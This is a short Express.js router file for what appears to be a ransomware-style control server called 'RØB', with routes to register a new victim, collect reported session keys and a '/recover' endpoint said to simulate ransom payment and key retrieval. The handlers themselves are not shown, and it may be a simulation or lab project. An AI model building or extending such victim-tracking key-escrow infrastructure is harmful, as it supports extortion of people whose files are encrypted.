import express from 'express';
import { newVictim, reportSessionKey, recoverKey } from '../controllers/attackController.js';

const router = express.Router();

// RØB Logic Routes
router.post('/new', newVictim); 
router.post('/session-keys', reportSessionKey);

// NEW: Recovery Endpoint (Simulates Payment & Key Retrieval)
router.post('/recover', recoverKey);

router.get('/health', (req, res) => res.json({ ok: true }));

export default router;